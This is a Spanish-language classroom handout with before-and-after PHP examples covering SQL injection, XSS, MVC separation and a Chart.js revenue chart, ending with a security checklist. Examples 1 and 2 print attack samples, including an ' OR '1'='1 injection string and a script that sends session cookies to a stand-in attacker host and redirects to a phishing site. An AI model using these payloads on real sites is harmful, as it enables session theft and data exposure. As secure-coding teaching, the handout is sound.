# 📚 EJEMPLOS PRÁCTICOS - ANTES Y DESPUÉS

## 🎯 Para Mostrar en Clase

Este archivo contiene ejemplos concretos de código MAL vs BIEN para proyectar en pantalla.

---

## ❌ EJEMPLO 1: SQL Injection (Vulnerabilidad Crítica)

### 🔴 CÓDIGO VULNERABLE (NUNCA HACER)

```php
<?php
// ⚠️ PELIGRO: SQL Injection
// Este código es INSEGURO y puede ser hackeado

$patente = $_GET['patente'];

// Concatenación directa - VULNERABLE
$sql = "SELECT * FROM vehiculos WHERE patente = '$patente'";
$result = $conn->query($sql);

$vehiculos = $result->fetchAll();
?>
```

### 💥 ATAQUE POSIBLE:

```
URL normal:
http://localhost/buscar.php?patente=ABCD12

URL de ataque:
http://localhost/buscar.php?patente=' OR '1'='1

SQL resultante:
SELECT * FROM vehiculos WHERE patente = '' OR '1'='1'

Resultado: ¡Devuelve TODOS los vehículos de la BD!
```

### ✅ CÓDIGO SEGURO (SIEMPRE HACER)

```php
<?php
// ✓ SEGURO: Prepared Statements con PDO
// Este código NO puede ser hackeado

$patente = $_GET['patente'];

// Prepared statement - SEGURO
$sql = "SELECT * FROM vehiculos WHERE patente = :patente";
$stmt = $conn->prepare($sql);
$stmt->execute([':patente' => $patente]);

$vehiculos = $stmt->fetchAll();
?>
```

### 🛡️ POR QUÉ ES SEGURO:

```
URL de ataque:
http://localhost/buscar.php?patente=' OR '1'='1

PDO trata esto como un valor literal:
patente = "' OR '1'='1"  (texto completo)

No existe un vehículo con esa patente → Resultado vacío
¡El ataque falla!
```

---

## ❌ EJEMPLO 2: XSS (Cross-Site Scripting)

### 🔴 CÓDIGO VULNERABLE

```php
<?php
// Vista que muestra nombre del usuario
$nombre = $usuario['nombre']; // Viene de la BD o formulario
?>

<h1>Bienvenido <?= $nombre ?></h1>
```

### 💥 ATAQUE POSIBLE:

```php
// Un usuario malicioso guarda esto en su perfil:
$nombre = "<script>
    // Robar cookies de sesión
    fetch('http://hacker.com/steal.php?cookie=' + document.cookie);
    // Redirigir a sitio falso
    window.location = 'http://phishing.com';
</script>";

// Resultado en HTML:
<h1>Bienvenido <script>
    fetch('http://hacker.com/steal.php?cookie=' + document.cookie);
    window.location = 'http://phishing.com';
</script></h1>

// ¡El script se ejecuta en el navegador de TODOS los usuarios!
```

### ✅ CÓDIGO SEGURO

```php
<?php
$nombre = $usuario['nombre'];
?>

<h1>Bienvenido <?= htmlspecialchars($nombre) ?></h1>
```

### 🛡️ QUÉ HACE htmlspecialchars():

```php
Entrada:
<script>alert('Hacked')</script>

Después de htmlspecialchars():
&lt;script&gt;alert('Hacked')&lt;/script&gt;

En el navegador se ve como texto:
<script>alert('Hacked')</script>

¡No se ejecuta! Solo se muestra como texto.
```

---

## ❌ EJEMPLO 3: Código Espagueti (Mezclar Todo)

### 🔴 CÓDIGO MALO (TODO EN LA VISTA)

```php
<!-- views/dashboard.php -->
<?php
session_start();

// ❌ SQL directo en la vista
$sql = "SELECT v.patente, v.modelo, r.estado, r.costo_estimado
        FROM reparaciones r
        INNER JOIN vehiculos v ON r.vehiculo_id = v.id
        WHERE r.estado != 'completado'
        ORDER BY r.id DESC";

$result = $conn->query($sql);

// ❌ Lógica de negocio en la vista
$total = 0;
$contador = 0;
while ($row = $result->fetch()) {
    if ($row['costo_estimado'] > 100000) {
        $color = 'red';
        $prioridad = 'ALTA';
    } else {
        $color = 'green';
        $prioridad = 'NORMAL';
    }
    
    $total += $row['costo_estimado'];
    $contador++;
    
    // ❌ HTML mezclado con PHP
    echo "<tr style='color: $color'>";
    echo "<td>" . $row['patente'] . "</td>";
    echo "<td>" . $row['modelo'] . "</td>";
    echo "<td>" . $row['estado'] . "</td>";
    echo "<td>$" . number_format($row['costo_estimado'], 0, ',', '.') . "</td>";
    echo "<td>$prioridad</td>";
    echo "</tr>";
}

$promedio = $contador > 0 ? $total / $contador : 0;
echo "<p>Promedio: $" . number_format($promedio, 0, ',', '.') . "</p>";
?>
```

**PROBLEMAS:**
- ❌ Imposible testear la lógica
- ❌ Difícil de mantener
- ❌ No se puede reutilizar en API móvil
- ❌ Mezcla presentación con lógica

---

### ✅ CÓDIGO BUENO (PATRÓN MVC)

**Archivo 1: app/services/ReparacionService.php**
```php
<?php
class ReparacionService {
    private $conn;
    
    public function __construct($conn) {
        $this->conn = $conn;
    }
    
    /**
     * ✓ Lógica de negocio en el servicio
     * ✓ Prepared statement
     * ✓ Retorno estructurado
     */
    public function obtenerReparacionesPendientes() {
        $sql = "SELECT v.patente, v.modelo, r.estado, r.costo_estimado
                FROM reparaciones r
                INNER JOIN vehiculos v ON r.vehiculo_id = v.id
                WHERE r.estado != :estado
                ORDER BY r.id DESC";
        
        $stmt = $this->conn->prepare($sql);
        $stmt->execute([':estado' => 'completado']);
        
        $reparaciones = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        // ✓ Procesar datos (agregar campos calculados)
        foreach ($reparaciones as &$rep) {
            $rep['prioridad'] = $rep['costo_estimado'] > 100000 ? 'ALTA' : 'NORMAL';
            $rep['color_badge'] = $rep['prioridad'] == 'ALTA' ? 'danger' : 'success';
        }
        
        return $reparaciones;
    }
    
    public function calcularEstadisticas($reparaciones) {
        if (empty($reparaciones)) {
            return ['total' => 0, 'promedio' => 0, 'cantidad' => 0];
        }
        
        $total = array_sum(array_column($reparaciones, 'costo_estimado'));
        $cantidad = count($reparaciones);
        
        return [
            'total' => $total,
            'promedio' => $total / $cantidad,
            'cantidad' => $cantidad
        ];
    }
}
?>
```

**Archivo 2: views/dashboard.php**
```php
<?php
session_start();

// ✓ Cargar dependencias
require_once '../config/db.php';
require_once '../app/services/ReparacionService.php';

// ✓ Usar servicio
$service = new ReparacionService($conn);
$reparaciones = $service->obtenerReparacionesPendientes();
$stats = $service->calcularEstadisticas($reparaciones);
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <title>Dashboard</title>
    <link rel="stylesheet" href="../css/style.css">
</head>
<body>
    <h1>Reparaciones Pendientes</h1>
    
    <!-- ✓ Vista solo presenta datos -->
    <table class="table">
        <thead>
            <tr>
                <th>Patente</th>
                <th>Modelo</th>
                <th>Estado</th>
                <th>Costo</th>
                <th>Prioridad</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($reparaciones as $rep): ?>
                <tr>
                    <td><?= htmlspecialchars($rep['patente']) ?></td>
                    <td><?= htmlspecialchars($rep['modelo']) ?></td>
                    <td>
                        <span class="badge bg-info">
                            <?= htmlspecialchars($rep['estado']) ?>
                        </span>
                    </td>
                    <td>$<?= number_format($rep['costo_estimado'], 0, ',', '.') ?></td>
                    <td>
                        <span class="badge bg-<?= $rep['color_badge'] ?>">
                            <?= htmlspecialchars($rep['prioridad']) ?>
                        </span>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    
    <!-- ✓ Estadísticas calculadas por el servicio -->
    <div class="alert alert-info">
        <strong>Estadísticas:</strong><br>
        Total: $<?= number_format($stats['total'], 0, ',', '.') ?><br>
        Promedio: $<?= number_format($stats['promedio'], 0, ',', '.') ?><br>
        Cantidad: <?= $stats['cantidad'] ?>
    </div>
</body>
</html>
```

**VENTAJAS:**
- ✅ Lógica testeable (se puede hacer unit testing del servicio)
- ✅ Reutilizable (el servicio puede usarse en API móvil)
- ✅ Mantenible (cambios en la lógica solo tocan el servicio)
- ✅ Seguro (prepared statements, htmlspecialchars)
- ✅ Vista limpia y legible

---

## 🔍 EJEMPLO 4: Consulta Compleja para Gráfico

### OBJETIVO:
Mostrar ingresos mensuales de los últimos 12 meses

### ✅ CÓDIGO COMPLETO (PASO A PASO)

**Paso 1: Consulta SQL en el Servicio**
```php
// app/services/DashboardService.php

public function obtenerIngresosMensuales() {
    $sql = "SELECT 
                -- Formatear mes como texto legible
                TO_CHAR(fecha, 'TMMonth YYYY') as mes,
                
                -- Sumar todos los montos del mes
                SUM(monto_total) as total,
                
                -- Ordenar por fecha (para gráfico secuencial)
                DATE_TRUNC('month', fecha) as fecha_orden
            FROM facturas
            WHERE fecha >= NOW() - INTERVAL '12 months'
            GROUP BY DATE_TRUNC('month', fecha), TO_CHAR(fecha, 'TMMonth YYYY')
            ORDER BY fecha_orden ASC";
    
    $stmt = $this->conn->prepare($sql);
    $stmt->execute();
    
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}
```

**Explicación de la consulta:**
```sql
-- TO_CHAR(fecha, 'TMMonth YYYY')
-- Convierte: 2025-01-15 → "Enero 2025"

-- DATE_TRUNC('month', fecha)
-- Trunca a inicio del mes: 2025-01-15 → 2025-01-01
-- Útil para agrupar todas las fechas del mismo mes

-- SUM(monto_total)
-- Suma todos los montos de ese mes

-- INTERVAL '12 months'
-- Filtra últimos 12 meses desde hoy
```

**Paso 2: Obtener Datos en la Vista**
```php
// views/dashboard.php

require_once '../app/services/DashboardService.php';

$dashboardService = new DashboardService($conn);
$ingresosMensuales = $dashboardService->obtenerIngresosMensuales();

// Ejemplo de resultado:
// [
//   ['mes' => 'Enero 2025', 'total' => '1500000'],
//   ['mes' => 'Febrero 2025', 'total' => '2300000']
// ]
```

**Paso 3: Pasar a JavaScript**
```php
<script>
// json_encode convierte array PHP a JSON válido
const datosIngresos = <?= json_encode($ingresosMensuales) ?>;

// En JS se ve así:
// [
//   {mes: "Enero 2025", total: "1500000"},
//   {mes: "Febrero 2025", total: "2300000"}
// ]
</script>
```

**Paso 4: Renderizar con Chart.js**
```javascript
// js/dashboard.js

function inicializarGraficoIngresos() {
    const ctx = document.getElementById('graficoIngresos');
    
    // Extraer arrays separados
    const labels = datosIngresos.map(item => item.mes);
    // labels = ["Enero 2025", "Febrero 2025"]
    
    const valores = datosIngresos.map(item => parseFloat(item.total));
    // valores = [1500000, 2300000]
    
    new Chart(ctx, {
        type: 'line',
        data: {
            labels: labels,    // Eje X
            datasets: [{
                label: 'Ingresos ($)',
                data: valores,  // Eje Y
                borderColor: 'rgba(75, 192, 192, 1)',
                backgroundColor: 'rgba(75, 192, 192, 0.2)',
                tension: 0.3,   // Curva suave
                fill: true      // Rellenar área bajo la línea
            }]
        },
        options: {
            responsive: true,
            plugins: {
                title: {
                    display: true,
                    text: 'Evolución de Facturación'
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    ticks: {
                        // Formatear números con separador de miles
                        callback: function(value) {
                            return '$' + value.toLocaleString('es-CL');
                        }
                    }
                }
            }
        }
    });
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', inicializarGraficoIngresos);
```

**Resultado Visual:**
```
Evolución de Facturación
$2,500,000 ┤                    ╭──●
           │                 ╭──╯
$2,000,000 ┤              ╭──╯
           │           ╭──╯
$1,500,000 ┤        ╭──●
           │     ╭──╯
$1,000,000 ┤  ╭──●
           └──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──
             E  F  M  A  M  J  J  A  S  O  N  D
```

---

## 🎓 RESUMEN DE BUENAS PRÁCTICAS

### ✅ SIEMPRE:
1. **Prepared Statements con PDO**
   ```php
   $stmt = $conn->prepare($sql);
   $stmt->execute([':param' => $value]);
   ```

2. **htmlspecialchars() al mostrar datos**
   ```php
   echo htmlspecialchars($dato);
   ```

3. **Separar lógica de presentación**
   - Servicios: SQL y lógica
   - Vistas: HTML y presentación
   - Controladores: Coordinación

4. **Manejo de errores**
   ```php
   try {
       // código
   } catch (PDOException $e) {
       error_log($e->getMessage());
       return [];
   }
   ```

### ❌ NUNCA:
1. Concatenar valores en SQL
2. Mostrar datos sin escapar
3. Poner SQL en las vistas
4. Mezclar HTML con lógica de negocio
5. Confiar en datos del usuario sin validar

---

## 📝 CHECKLIST DE SEGURIDAD

Antes de entregar código, verificar:

- [ ] Todos los SQL usan prepared statements
- [ ] Todos los echo/print tienen htmlspecialchars
- [ ] No hay SQL directo en las vistas
- [ ] No hay lógica de negocio en las vistas
- [ ] Los CSS están en archivos .css (no inline)
- [ ] Los JS están en archivos .js (no inline)
- [ ] Las contraseñas se guardan con password_hash()
- [ ] Las sesiones se validan en páginas protegidas
- [ ] Los errores de BD no se muestran al usuario final

---

**¡Código seguro = Código profesional!** 🛡️
